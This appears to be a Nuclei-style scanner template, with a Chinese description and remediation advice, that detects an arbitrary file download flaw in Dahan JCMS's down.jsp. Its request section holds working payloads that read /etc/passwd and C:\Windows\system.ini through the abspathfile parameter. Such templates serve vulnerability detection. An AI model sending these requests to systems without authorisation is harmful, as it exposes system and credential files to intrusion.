id: JCMS-m_1_9_user_Down_Jsp-FileDownload
info:
  name: 大汉 JCMS /jcms/m_1_9/user/down.jsp 文件下载漏洞
  author:
  - l0ne1y
  description: |-
    大汉JCMS down.jsp 任意文件下载漏洞
    大汉JCMS是一款内容管理系统，基于J2EE构架设计。系统提供了从内容采集、创建、管理、传递、发布、共享呈送等信息全生命周期过程中所需的各项功能。

    大汉JCMS存在任意文件下载漏洞，攻击者可利用漏洞读取任意文件内容。
  severity: medium
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://www.hanweb.com/

    临时修复方案：
    1、过滤\".\"，使用户在url中不能回溯上级目录。
    2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。
    3、禁止系统提供目录遍历服务，如：php.ini配置open_basedir限定文件访问范围。
    4、文件路径保存至数据库，让用户提交文件对应ID下载文件。
    5、用户下载文件之前进行权限校验。
requests:
- matchers:
  - type: dsl
    condition: or
    dsl:
    - status_code_1==200 && contains(body_1,"bash")
    - status_code_2==200 && contains(body_2,"16-bit")
  matchers-condition: and
  path:
  - '{{BaseURL}}/jcms/m_1_9/user/down.jsp?abspathfile=/etc/passwd'
  - '{{BaseURL}}/jcms/m_1_9/user/down.jsp?abspathfile=C:\Windows\system.ini'
  method: GET
